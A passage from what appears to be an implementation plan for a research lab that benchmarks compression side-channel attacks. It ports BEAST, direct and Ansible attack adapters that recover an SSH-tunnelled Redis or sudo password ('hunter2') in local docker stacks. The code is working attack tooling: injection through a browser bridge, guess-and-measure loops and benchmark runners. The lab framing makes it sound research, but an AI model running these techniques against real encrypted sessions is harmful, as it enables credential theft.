    print(f"  Total elapsed: {elapsed:.1f}s  "
          f"total guesses: {r1['total_guesses'] + r2['total_guesses']}")
    if password != "hunter2":
        fail(f"recovered {password!r}, expected 'hunter2'")
    print("  [ok] hunter2 recovered")
```

Also update the header docstring: add a 6th bullet "Recover hunter2 via the direct variant's `/run_attack_v2`".

You may delete the `beast_attack_not_applicable` stub — it was only there as a placeholder to give the diff a clear insertion point. Final file must not contain it.

- [ ] **Step 3: Run it**

```bash
python scripts/verify_direct.py
```

Expected: all 6 steps pass; final "VERIFICATION PASSED" line shows. Takes ~4 minutes.

- [ ] **Step 4: Commit**

```bash
git add scripts/verify_direct.py
git commit -m "feat: Rename verify.py to verify_direct.py and wire to /run_attack_v2"
```

---

### Task 9 (validation gate): Direct variant correctness

This is a checkpoint, not new code.

- [ ] **Step 1: Clean rebuild and run verify_direct end-to-end**

```bash
docker compose down -v
docker compose up -d --build
# Wait for client+attacker readiness (up to 30s)
sleep 30
python scripts/verify_direct.py
```

Expected: exit code 0, "hunter2 recovered" printed, and the old `/run_attack` endpoint untouched. If this fails, stop and debug before continuing to Phase 2.

---

## Phase 2 — BEAST adapter

### Task 10: Port the BEAST adapter and register it

**Files:**
- Modify: `attacker/attack/adapters/beast.py`
- Modify: `attacker/mitm.py` (adapter registry + BrowserBridge wiring)

Refer to `attacker/attack_beast.py` for the current logic: `BrowserBridge` class, `_c2s_data_only`, `make_beast_sweep` (the outlier-retry loop is now engine-side).

- [ ] **Step 1: Write `adapters/beast.py`**

```python
"""BEAST adapter — browser-based injection via sendBeacon().

Preserves the current behaviour: sendBeacon() fuses CHANNEL_OPEN + data
into a single injection, so there is no pre-opened measure channel.
The measurement filter (config.measurement_min_segment_size, default 100
for BEAST) excludes the small CHANNEL_OPEN packet.

BrowserBridge (shared WebSocket state) is owned by mitm.py and injected
into the adapter; the adapter only sees an `inject(bytes)` coroutine.
"""

from __future__ import annotations

import asyncio
import random
from typing import Any

import aiohttp

from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import (
    CLIENT_BASE, LISTEN_PORT, _sum_c2s,
)


class BeastAdapter:
    def __init__(self, packet_log: Any, bridge: Any) -> None:
        self._packet_log = packet_log
        self._bridge = bridge
        self._config: AttackConfig | None = None
        self._session: aiohttp.ClientSession | None = None
        self._flush_data: bytes | None = None

    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None:
        self._config = config
        self._session = http_session
        # Cache one flush block for the life of the attack; engine-side
        # outlier retry will regenerate it when a round is discarded.
        self._flush_data = _make_flush(config)

    async def teardown(self) -> None:
        self._config = None
        self._session = None
        self._flush_data = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None and self._flush_data is not None

        # 1. Flush via sendBeacon
        if cfg.flush_bytes > 0:
            await self._bridge.inject(self._flush_data)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 2. Trigger secret
        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 3. Clear log, send guess, read
        self._packet_log.clear()
        await self._bridge.inject(prefix + candidate + alignment)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        return _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\r",
            min_margin=64,
            max_rounds=64,
            settle=0.01,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=False,
            stall_detection=False,
            alignment_hint_carryover=False,
            outlier_threshold=32,
            flush_bytes=33000,
            flush_pool="high_ascii",
            measurement_min_segment_size=100,
            label="beast-default",
        )


def _make_flush(cfg: AttackConfig) -> bytes:
    if cfg.flush_pool == "high_ascii":
        return bytes(random.choices(range(0x80, 0x100), k=cfg.flush_bytes))
    # Defensive fallback; BEAST shouldn't use secrets_random in practice.
    import secrets
    return secrets.token_bytes(cfg.flush_bytes)
```

- [ ] **Step 2: Wire the adapter into `mitm.py`**

In the `_ADAPTER_BY_VARIANT` dict in `mitm.py`, add the BEAST entry:

```python
from attacker.attack.adapters.beast import BeastAdapter

_ADAPTER_BY_VARIANT: dict[str, Any] = {
    "direct": DirectAdapter,
    "beast": BeastAdapter,
}
```

In `_build_adapter`, add the BEAST branch:

```python
def _build_adapter(adapter_cls: Any, variant: str) -> Any:
    if variant == "direct":
        return adapter_cls(packet_log=PACKET_LOG)
    if variant == "beast":
        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")
```

- [ ] **Step 3: Rebuild attacker**

```bash
docker compose up -d --build attacker
docker compose logs --tail 30 attacker
```

Expected: clean start, no import errors.

- [ ] **Step 4: Commit**

```bash
git add attacker/attack/adapters/beast.py attacker/mitm.py
git commit -m "feat: BEAST adapter wired to unified engine"
```

---

### Task 11: Rewire `scripts/verify_beast.py` to `/run_attack_v2`

**Files:**
- Modify: `scripts/verify_beast.py`

- [ ] **Step 1: Replace the `beast_attack` helper**

Replace the existing `beast_attack` function (around lines 68-75) with:

```python
def beast_attack(known_prefix: str, alphabet: str, max_length: int) -> dict:
    body = json.dumps({
        "variant": "beast",
        "config": {
            "known_prefix": known_prefix,
            "alphabet": alphabet,
            "max_length": max_length,
        },
    }).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack_v2", body=body,
                content_type="application/json")
```

No other changes; the rest of the script already consumes the response correctly.

- [ ] **Step 2: Run it**

```bash
python scripts/verify_beast.py
```

Expected: exit code 0, "Status: PASS" printed, `hunter2` recovered. Takes ~20 minutes.

- [ ] **Step 3: Commit**

```bash
git add scripts/verify_beast.py
git commit -m "feat: verify_beast.py uses /run_attack_v2"
```

---

### Task 12 (validation gate): BEAST variant correctness

- [ ] **Step 1: Run verify_beast end-to-end**

```bash
python scripts/verify_beast.py
```

Expected: "Status: PASS", `hunter2` recovered. If this fails, stop and debug.

---

## Phase 3 — Ansible adapter

### Task 13: Port the Ansible adapter and register it

**Files:**
- Modify: `attacker/attack/adapters/ansible.py`
- Modify: `attacker/mitm.py` (adapter registry)

Refer to `attacker/attack_ansible.py` for current behaviour. The new adapter drops per-position `noise_hints` (replaced by `alignment_hint_carryover`) and the `_find_significant_noise` helper (replaced by engine's `_pick_alignment_with_largest_gap`).

- [ ] **Step 1: Write `adapters/ansible.py`**

```python
"""Ansible adapter — fresh SSH per guess.

Each oracle query triggers a fresh ansible-playbook run on the client
via /send_secret_ansible, then opens a direct-tcpip channel through the
already-live SSH connection via the client's Ansible LocalForward port.
No flush is needed — the fresh SSH connection starts with an empty zlib
window.

Ordering per oracle query (preserved from attacker/attack_ansible.py):
  1. Trigger ansible-playbook run (blocks until "Sending become_password").
  2. Open the measure tunnel (direct-tcpip CHANNEL_OPEN).
  3. Settle so CHANNEL_OPEN reaches the sniffer.
  4. Clear packet log.
  5. Write guess on the measure tunnel.
  6. Settle.
  7. Read packet log.
  8. Close the measure tunnel.
"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import Any

import aiohttp

from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import CLIENT_BASE, _sum_c2s

LOG = logging.getLogger("attack.ansible")

CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


class AnsibleAdapter:
    def __init__(self, packet_log: Any) -> None:
        self._packet_log = packet_log
        self._config: AttackConfig | None = None
        self._session: aiohttp.ClientSession | None = None

    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # 1. Trigger ansible-playbook run (blocks until password in flight)
        async with self._session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
            body = await r.json()
            if not body.get("ok", False):
                raise RuntimeError(f"send_secret_ansible failed: {body}")

        # 2. Open measure tunnel
        try:
            _, mw = await _open_ansible_tunnel()
        except OSError as exc:
            LOG.warning("ansible measure open failed: %s", exc)
            return 0

        # 3. Settle so CHANNEL_OPEN reaches the sniffer
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 4-7. Clear, write guess, settle, read
        self._packet_log.clear()
        try:
            mw.write(prefix + candidate + alignment)
            await mw.drain()
        except (ConnectionResetError, BrokenPipeError, OSError) as exc:
            LOG.warning("ansible measure write failed: %s", exc)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        measured = _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

        # 8. Close
        try:
            mw.close()
        except Exception:  # noqa: BLE001
            pass

        return measured

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"\x5e\x00\x00\x00\x00\x00\x00\x00",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\n",
            min_margin=8,
            max_rounds=96,
            settle=0.1,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=False,
            stall_detection=False,
            alignment_hint_carryover=False,
            outlier_threshold=0,
            flush_bytes=0,
            flush_pool="none",
            measurement_min_segment_size=0,
            label="ansible-default",
        )


async def _open_ansible_tunnel(retries: int = 20, delay: float = 0.25) -> tuple:
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, ANSIBLE_TUNNEL_PORT)
        except (OSError, ConnectionRefusedError):
            if attempt >= retries:
                raise
            await asyncio.sleep(delay)
    raise RuntimeError("unreachable")
```

- [ ] **Step 2: Wire the adapter into `mitm.py`**

Extend the imports and registry:

```python
from attacker.attack.adapters.ansible import AnsibleAdapter

_ADAPTER_BY_VARIANT: dict[str, Any] = {
    "direct": DirectAdapter,
    "beast": BeastAdapter,
    "ansible": AnsibleAdapter,
}
```

In `_build_adapter`, add the Ansible branch:

```python
def _build_adapter(adapter_cls: Any, variant: str) -> Any:
    if variant == "direct":
        return adapter_cls(packet_log=PACKET_LOG)
    if variant == "beast":
        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
    if variant == "ansible":
        return adapter_cls(packet_log=PACKET_LOG)
    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")
```

- [ ] **Step 3: Rebuild attacker**

```bash
docker compose up -d --build attacker
docker compose logs --tail 30 attacker
```

Expected: clean start.

- [ ] **Step 4: Commit**

```bash
git add attacker/attack/adapters/ansible.py attacker/mitm.py
git commit -m "feat: Ansible adapter wired to unified engine"
```

---

### Task 14: Rewire `scripts/verify_ansible.py` to `/run_attack_v2`

**Files:**
- Modify: `scripts/verify_ansible.py`

- [ ] **Step 1: Replace the two attack calls**

In `scripts/verify_ansible.py`, replace both `http("POST", f"{ATTACKER_BASE}/run_attack_ansible", ...)` calls with calls to `/run_attack_v2` and wrap the body in the new shape.

Find the phase-1 block (around lines 149-157):

```python
    phase1_body = json.dumps({
        "known_prefix": PHASE1_PREFIX,
        "alphabet": PHASE1_ALPHABET,
        "max_length": 1,
        "terminator": "\x00",
        "min_margin": 8,
        "max_rounds": 96,
        "noise_hints": [ 1 ],
    }).encode("utf-8")
    t1 = time.time()
    r1 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
              body=phase1_body, content_type="application/json")
```

Replace with:

```python
    phase1_body = json.dumps({
        "variant": "ansible",
        "config": {
            "known_prefix": PHASE1_PREFIX,
            "alphabet": PHASE1_ALPHABET,
            "max_length": 1,
            "terminator": "\x00",
            "min_margin": 8,
            "max_rounds": 96,
            # noise_hints is gone — use fixed_single alignment for phase 1
            # where we already know the winning alignment length is 1.
            "alignment_mode": "fixed_single",
            "alignment_lengths": [1],
        },
    }).encode("utf-8")
    t1 = time.time()
    r1 = http("POST", f"{ATTACKER_BASE}/run_attack_v2",
              body=phase1_body, content_type="application/json")
```

Find the phase-2 block (around lines 178-188):

```python
    phase2_body = json.dumps({
        "known_prefix": phase2_prefix,
        "alphabet": PHASE2_ALPHABET,
        "max_length": length_byte,
        "terminator": "\n",
        "min_margin": 8,
        "max_rounds": 96,
        "noise_hints": [ 1 ] * length_byte
    }).encode("utf-8")
    r2 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
              body=phase2_body, content_type="application/json")
```

Replace with:

```python
    phase2_body = json.dumps({
        "variant": "ansible",
        "config": {
            "known_prefix": phase2_prefix,
            "alphabet": PHASE2_ALPHABET,
            "max_length": length_byte,
            "terminator": "\n",
            "min_margin": 8,
            "max_rounds": 96,
            "alignment_mode": "fixed_single",
            "alignment_lengths": [1],
        },
    }).encode("utf-8")
    r2 = http("POST", f"{ATTACKER_BASE}/run_attack_v2",
              body=phase2_body, content_type="application/json")
```

- [ ] **Step 2: Run it**

```bash
python scripts/verify_ansible.py
```

Expected: exit code 0, "Status: PASS", hunter2 recovered. Takes ~10–30 minutes depending on the fixed-alignment hit rate.

- [ ] **Step 3: Commit**

```bash
git add scripts/verify_ansible.py
git commit -m "feat: verify_ansible.py uses /run_attack_v2"
```

---

### Task 15 (validation gate): Ansible variant correctness

- [ ] **Step 1: Run verify_ansible end-to-end**

```bash
python scripts/verify_ansible.py
```

Expected: "Status: PASS", hunter2 recovered. If this fails, stop and debug.

---

## Phase 4 — Cleanup (delete old code)

### Task 16: Remove old attack modules, shim endpoints, and obsolete test scripts

**Files:**
- Delete: `attacker/attack.py`
- Delete: `attacker/attack_beast.py`
- Delete: `attacker/attack_ansible.py`
- Delete: `scripts/test_attack.py`
- Delete: `scripts/test_attack_ansible.py`
- Delete: `scripts/test_attack_random.py`
- Modify: `attacker/mitm.py` (remove shim imports, handlers, routes)

- [ ] **Step 1: Move BrowserBridge from `attack_beast.py` into the adapter package**

The shim-era adapter imports `BrowserBridge` from `attack_beast.py`. Before deleting the old file, copy the `BrowserBridge` class into a new location.

Create `attacker/attack/adapters/browser_bridge.py`:

```python
"""Async bridge between attack logic and a WebSocket-connected browser.

Moved here from attacker/attack_beast.py as part of the unified-engine
refactor.
"""

from __future__ import annotations

import asyncio
import base64
import logging
from typing import Any

LOG = logging.getLogger("attack.browser_bridge")


class BrowserBridge:
    def __init__(self) -> None:
        self._ws: Any = None
        self._pending: dict[int, asyncio.Future] = {}
        self._next_id = 0
        self._ready = asyncio.Event()

    @property
    def connected(self) -> bool:
        return self._ws is not None and not self._ws.closed

    def set_ws(self, ws: Any) -> None:
        self._ws = ws
        self._ready.set()

    def clear_ws(self) -> None:
        self._ws = None
        self._ready.clear()
        for fut in self._pending.values():
            if not fut.done():
                fut.cancel()
        self._pending.clear()

    async def wait_ready(self, timeout: float = 120) -> None:
        await asyncio.wait_for(self._ready.wait(), timeout=timeout)

    async def inject(self, data: bytes) -> None:
        if not self.connected:
            raise RuntimeError("browser not connected")
        msg_id = self._next_id
        self._next_id += 1
        fut = asyncio.get_running_loop().create_future()
        self._pending[msg_id] = fut
        await self._ws.send_json({
            "cmd": "fetch",
            "id": msg_id,
            "body": base64.b64encode(data).decode("ascii"),
        })
        try:
            await asyncio.wait_for(fut, timeout=30)
        finally:
            self._pending.pop(msg_id, None)

    def on_message(self, data: dict) -> None:
        cmd = data.get("cmd")
        if cmd == "done":
            msg_id = data.get("id")
            fut = self._pending.get(msg_id)
            if fut and not fut.done():
                fut.set_result(None)
        elif cmd == "ready":
            LOG.info("browser reported ready")
```

- [ ] **Step 2: Update `mitm.py` to import `BrowserBridge` from its new home**

Replace:

```python
from attack_beast import BrowserBridge, run_attack as run_beast_attack
```

with:

```python
from attacker.attack.adapters.browser_bridge import BrowserBridge
```

Remove these imports as well:

```python
from attack import run_attack as run_crime_attack
from attack_ansible import run_attack as run_ansible_attack
```

- [ ] **Step 3: Remove shim handlers and routes**

Delete from `mitm.py`:
- `handle_run_attack` (the old direct handler)
- `handle_run_attack_ansible`
- `handle_run_attack_beast`
- The three corresponding `app.router.add_post("/run_attack*", ...)` lines.

Rename the new route from `/run_attack_v2` to `/run_attack` (it's the only one left). Update the handler name accordingly: `handle_run_attack_v2` → `handle_run_attack`.

- [ ] **Step 4: Delete the old files**

```bash
git rm attacker/attack.py attacker/attack_beast.py attacker/attack_ansible.py
git rm scripts/test_attack.py scripts/test_attack_ansible.py scripts/test_attack_random.py
```

- [ ] **Step 5: Update the three verify scripts to point at `/run_attack` (no `_v2` suffix)**

```bash
grep -l run_attack_v2 scripts/
# Expected: scripts/verify_direct.py scripts/verify_beast.py scripts/verify_ansible.py
sed -i 's|/run_attack_v2|/run_attack|g' scripts/verify_*.py
```

- [ ] **Step 6: Rebuild and re-run all three verify scripts**

```bash
docker compose down -v
docker compose up -d --build
sleep 30
python scripts/verify_direct.py
python scripts/verify_beast.py
python scripts/verify_ansible.py
```

Expected: all three exit 0 with `hunter2` recovered. This is the final correctness gate — the old attack modules are gone and nothing else imports them.

- [ ] **Step 7: Commit**

```bash
git add -A attacker/ scripts/
git commit -m "feat: Remove old per-variant attack modules and route shims"
```

---

## Phase 5 — Benchmark harness

### Task 17: Extend `benchmark.py` with scenarios, fixed-nl, and per-position aggregation

**Files:**
- Modify: `scripts/benchmark.py`

The existing `benchmark.py` already parallelises docker-compose stacks, runs trials, and aggregates per-variant guess counts. We extend it with scenario presets, raw-config overrides, and per-position aggregation.

- [ ] **Step 1: Define the scenario preset table near the top of the file**

Add, after the `ANSIBLE_PHASE2_TERMINATOR = "\n"` block:

```python
SCENARIO_PRESETS: dict[str, dict] = {
    "baseline": {
        "alignment_mode": "full_sweep",
        "candidate_elimination": False,
        "constant_prefix_trim": True,
        "adaptive_alignment": False,
        "stall_detection": False,
        "alignment_hint_carryover": False,
    },
    "full-sweep": {
        "alignment_mode": "full_sweep",
        "candidate_elimination": True,
        "constant_prefix_trim": True,
        "adaptive_alignment": False,
        "stall_detection": False,
        "alignment_hint_carryover": False,
    },
    "fixed-nl": {
        "alignment_mode": "fixed_single",
        "candidate_elimination": True,
        "constant_prefix_trim": True,
        "adaptive_alignment": False,
        "stall_detection": False,
        "alignment_hint_carryover": False,
        # alignment_lengths is filled in from --fixed-nl
    },
    "all-opts": {
        "alignment_mode": "full_sweep",
        "candidate_elimination": True,
        "constant_prefix_trim": True,
        "adaptive_alignment": True,
        "stall_detection": True,
        "alignment_hint_carryover": True,
    },
}


def _build_config_override(
    scenario: str, fixed_nl: int | None, label_suffix: str,
) -> dict:
    if scenario not in SCENARIO_PRESETS:
        raise ValueError(f"unknown scenario {scenario!r}")
    cfg = dict(SCENARIO_PRESETS[scenario])
    if scenario == "fixed-nl":
        if fixed_nl is None:
            raise ValueError("--fixed-nl N is required with --scenario fixed-nl")
        cfg["alignment_lengths"] = [int(fixed_nl)]
    cfg["label"] = f"{scenario}{label_suffix}"
    return cfg
```

- [ ] **Step 2: Replace the per-variant runners with a single unified runner**

Replace the existing `run_direct`, `run_beast`, `run_ansible`, and `VARIANT_RUNNERS` block with:

```python
def _http_run_attack(
    attacker_base: str, variant: str, config_override: dict,
    known_prefix: str, alphabet: str, max_length: int,
    terminator: str | None = None,
) -> dict:
    body_cfg = dict(config_override)
    body_cfg["known_prefix"] = known_prefix
    body_cfg["alphabet"] = alphabet
    body_cfg["max_length"] = max_length
    if terminator is not None:
        body_cfg["terminator"] = terminator
    return http(
        f"{attacker_base}/run_attack",
        method="POST",
        body={"variant": variant, "config": body_cfg},
    )


def _run_two_phase(
    attacker_base: str,
    variant: str,
    base_config: dict,
    set_secret_url: str,
    password: str,
    phase1_prefix: str,
    phase1_alphabet: str,
    phase1_max: int,
    phase1_terminator: str | None,
    phase2_prefix_from_phase1,
    phase2_alphabet: str,
    phase2_max_fn,
    phase2_terminator: str | None,
    strip_trailing: str,
) -> dict:
    http(set_secret_url, method="POST", body={"value": password})
    time.sleep(1.0)

    r1 = _http_run_attack(
        attacker_base, variant, base_config,
        phase1_prefix, phase1_alphabet, phase1_max, phase1_terminator,
    )
    phase1_recovered = r1["recovered"]

    r2 = _http_run_attack(
        attacker_base, variant, base_config,
        phase2_prefix_from_phase1(phase1_recovered),
        phase2_alphabet,
        phase2_max_fn(phase1_recovered),
        phase2_terminator,
    )
    recovered = r2["recovered"].rstrip(strip_trailing)

    return {
        "recovered": recovered,
        "phase1_guesses": r1.get("total_guesses", -1),
        "phase2_guesses": r2.get("total_guesses", -1),
        "total_guesses": r1.get("total_guesses", 0) + r2.get("total_guesses", 0),
        "elapsed": r1.get("elapsed_seconds", 0) + r2.get("elapsed_seconds", 0),
        "phase1_per_position": r1.get("per_position", []),
        "phase2_per_position": r2.get("per_position", []),
    }


def run_variant(
    variant: str,
    base_config: dict,
    attacker_base: str,
    client_base: str,
    password: str,
    pw_alphabet: str,
) -> dict:
    if variant == "direct":
        return _run_two_phase(
            attacker_base, "direct", base_config,
            set_secret_url=f"{client_base}/set_secret",
            password=password,
            phase1_prefix=RESP_PREFIX,
            phase1_alphabet=LEN_ALPHABET,
            phase1_max=4,
            phase1_terminator=None,
            phase2_prefix_from_phase1=lambda s: RESP_PREFIX + s + "\r\n",
            phase2_alphabet=pw_alphabet,
            phase2_max_fn=lambda s: int(s) + 4,
            phase2_terminator=None,
            strip_trailing="\r",
        )
    if variant == "beast":
        return _run_two_phase(
            attacker_base, "beast", base_config,
            set_secret_url=f"{client_base}/set_secret",
            password=password,
            phase1_prefix=RESP_PREFIX,
            phase1_alphabet=LEN_ALPHABET,
            phase1_max=4,
            phase1_terminator=None,
            phase2_prefix_from_phase1=lambda s: RESP_PREFIX + s + "\r\n",
            phase2_alphabet=pw_alphabet,
            phase2_max_fn=lambda s: int(s) + 4,
            phase2_terminator=None,
            strip_trailing="\r",
        )
    if variant == "ansible":
        return _run_two_phase(
            attacker_base, "ansible", base_config,
            set_secret_url=f"{client_base}/set_sudo_secret",
            password=password,
            phase1_prefix=ANSIBLE_PHASE1_PREFIX,
            phase1_alphabet=ANSIBLE_PHASE1_ALPHABET,
            phase1_max=1,
            phase1_terminator=ANSIBLE_PHASE1_TERMINATOR,
            phase2_prefix_from_phase1=lambda length_str: ANSIBLE_PHASE1_PREFIX + length_str,
            phase2_alphabet=pw_alphabet,
            phase2_max_fn=lambda length_str: len(password) + 4,
            phase2_terminator=ANSIBLE_PHASE2_TERMINATOR,
            strip_trailing="\n",
        )
    raise ValueError(f"unknown variant {variant!r}")
```

- [ ] **Step 3: Update the worker to use the new runner and include per-position data**

Replace the worker's per-trial loop block (the `for trial_idx in trial_indices:` body that currently calls `runner = VARIANT_RUNNERS[variant]`) with:

```python
    for trial_idx in trial_indices:
        password = passwords[trial_idx]
        for variant in variants:
            t0 = time.time()
            try:
                result = run_variant(
                    variant=variant,
                    base_config=config_override,
                    attacker_base=attacker_base,
                    client_base=client_base,
                    password=password,
                    pw_alphabet=pw_alphabet,
                )
                ok = result["recovered"] == password
                status = "PASS" if ok else f"FAIL(expected={password!r}, got={result['recovered']!r})"
            except Exception as exc:  # noqa: BLE001
                result = {
                    "recovered": f"<error: {exc}>",
                    "phase1_guesses": -1,
                    "phase2_guesses": -1,
                    "total_guesses": -1,
                    "elapsed": 0.0,
                    "phase1_per_position": [],
                    "phase2_per_position": [],
                }
                ok = False
                status = f"ERROR: {exc}"
            wall = time.time() - t0
            row = {
                "stack": stack_idx,
                "project": project,
                "trial": trial_idx,
                "variant": variant,
                "scenario": config_override.get("label", ""),
                "password": password,
                "recovered": result["recovered"],
                "ok": ok,
                "total_guesses": result["total_guesses"],
                "phase1_guesses": result.get("phase1_guesses"),
                "phase2_guesses": result.get("phase2_guesses"),
                "phase1_per_position": result.get("phase1_per_position", []),
                "phase2_per_position": result.get("phase2_per_position", []),
                "wall_seconds": wall,
                "status": status,
            }
            with results_lock:
                results.append(row)
            print(f"{tag} trial={trial_idx:3d} variant={variant:7s} "
                  f"guesses={result['total_guesses']:>7} wall={wall:6.1f}s  {status}",
                  flush=True)
```

The worker's signature must accept `config_override` as a new parameter. Update the `threading.Thread` call site in `main()` to pass it through.

- [ ] **Step 4: Extend `summarise` with per-position aggregation**

Replace `summarise` and `print_summary` with:

```python
def summarise(results: list[dict], variants: list[str]) -> dict:
    summary: dict[str, dict] = {}
    for v in variants:
        vr = [r for r in results if r["variant"] == v]
        passed = [r for r in vr if r["ok"]]
        per_attack = [r["total_guesses"] for r in passed]

        # Per-position: flatten both phase lists across all passed trials.
        per_position_guesses: list[int] = []
        for r in passed:
            for entry in (r.get("phase1_per_position") or []):
                per_position_guesses.append(entry["guesses"])
            for entry in (r.get("phase2_per_position") or []):
                per_position_guesses.append(entry["guesses"])

        def stats(xs: list[int]) -> dict:
            return {
                "count": len(xs),
                "min": min(xs) if xs else None,
                "max": max(xs) if xs else None,
                "avg": (sum(xs) / len(xs)) if xs else None,
                "total": sum(xs),
            }

        summary[v] = {
            "trials_total": len(vr),
            "trials_passed": len(passed),
            "trials_failed": len(vr) - len(passed),
            "per_attack": stats(per_attack),
            "per_position": stats(per_position_guesses),
        }
    return summary


def print_summary(summary: dict) -> None:
    print()
    print("=" * 96)
    print("SUMMARY  (per-attack | per-position)")
    print("=" * 96)
    header = (
        f"{'variant':<10} {'passed':>7} "
        f"{'a.min':>8} {'a.max':>8} {'a.avg':>10} {'a.total':>12} | "
        f"{'p.min':>6} {'p.max':>6} {'p.avg':>8} {'p.count':>7}"
    )
    print(header)
    print("-" * len(header))
    for v, s in summary.items():
        pa = s["per_attack"]
        pp = s["per_position"]
        def fmt(x, fmt_spec=""):
            return "-" if x is None else format(x, fmt_spec)
        print(
            f"{v:<10} {s['trials_passed']:>7} "
            f"{fmt(pa['min']):>8} {fmt(pa['max']):>8} "
            f"{fmt(pa['avg'], '.1f'):>10} {pa['total']:>12} | "
            f"{fmt(pp['min']):>6} {fmt(pp['max']):>6} "
            f"{fmt(pp['avg'], '.1f'):>8} {pp['count']:>7}"
        )
```

- [ ] **Step 5: Extend the CLI with `--scenario`, `--fixed-nl`, `--config`, and a CSV output**

Add these flags to the `ArgumentParser` block in `main()`:

```python
    ap.add_argument("--scenario", default="all-opts",
                    choices=list(SCENARIO_PRESETS.keys()),
                    help="named optimization preset")
    ap.add_argument("--fixed-nl", type=int, default=None,
                    help="required with --scenario fixed-nl: single alignment length")
    ap.add_argument("--config", default=None,
                    help="path to raw JSON config override; if set, overrides --scenario")
    ap.add_argument("--csv-summary", default="benchmark_summary.csv",
                    help="path for the one-row-per-variant CSV summary")
```

Inside `main()`, build `config_override` before launching workers:

```python
    if args.config:
        with open(args.config) as f:
            config_override = json.load(f)
        if "label" not in config_override:
            config_override["label"] = os.path.basename(args.config)
    else:
        config_override = _build_config_override(
            args.scenario, args.fixed_nl,
            label_suffix=(f"-nl{args.fixed_nl}" if args.scenario == "fixed-nl" else ""),
        )
    print(f"  scenario      : {args.scenario}")
    print(f"  config label  : {config_override['label']}")
```

Pass `config_override` into each worker thread (add it to the `args=(...)` tuple where workers are launched).

After `print_summary(summary)` in `main()`, add CSV emission:

```python
    import csv
    with open(args.csv_summary, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow([
            "variant", "scenario", "trials_passed",
            "per_attack_min", "per_attack_max", "per_attack_avg", "per_attack_total",
            "per_position_count",
            "per_position_min", "per_position_max", "per_position_avg",
        ])
        for v, s in summary.items():
            pa = s["per_attack"]
            pp = s["per_position"]
            w.writerow([
                v, config_override["label"], s["trials_passed"],
                pa["min"], pa["max"],
                f"{pa['avg']:.1f}" if pa["avg"] is not None else "",
                pa["total"],
                pp["count"],
                pp["min"], pp["max"],
                f"{pp['avg']:.1f}" if pp["avg"] is not None else "",
            ])
    print(f"CSV summary -> {args.csv_summary}")
```

- [ ] **Step 6: Commit**

```bash
git add scripts/benchmark.py
git commit -m "feat: benchmark.py scenario presets and per-position aggregation"
```

---

### Task 18: Smoke-test benchmark.py across all four scenarios

This is a validation task, not new code.

- [ ] **Step 1: Low-trial smoke run against each scenario**

```bash
# 2 stacks, 2 trials each: ~10 minutes per scenario for direct + ansible;
# BEAST alone is ~20 min per trial so skip it in the smoke (add it later
# if you want the full data point).
python scripts/benchmark.py --stacks 2 --trials 2 \
    --variants direct,ansible --scenario baseline \
    --output /tmp/bench_baseline.json --csv-summary /tmp/bench_baseline.csv

python scripts/benchmark.py --stacks 2 --trials 2 \
    --variants direct,ansible --scenario full-sweep \
    --output /tmp/bench_fullsweep.json --csv-summary /tmp/bench_fullsweep.csv

python scripts/benchmark.py --stacks 2 --trials 2 \
    --variants direct,ansible --scenario fixed-nl --fixed-nl 1 \
    --output /tmp/bench_fixed.json --csv-summary /tmp/bench_fixed.csv

python scripts/benchmark.py --stacks 2 --trials 2 \
    --variants direct,ansible --scenario all-opts \
    --output /tmp/bench_allopts.json --csv-summary /tmp/bench_allopts.csv
```

Expected: each run exits 0; each CSV has two data rows (direct, ansible); each JSON contains `per_position` arrays on every trial result. Guess counts for `all-opts` should be strictly lower than for `baseline` on the direct variant (where adaptive_alignment contributes).

- [ ] **Step 2: Spot-check one CSV**

```bash
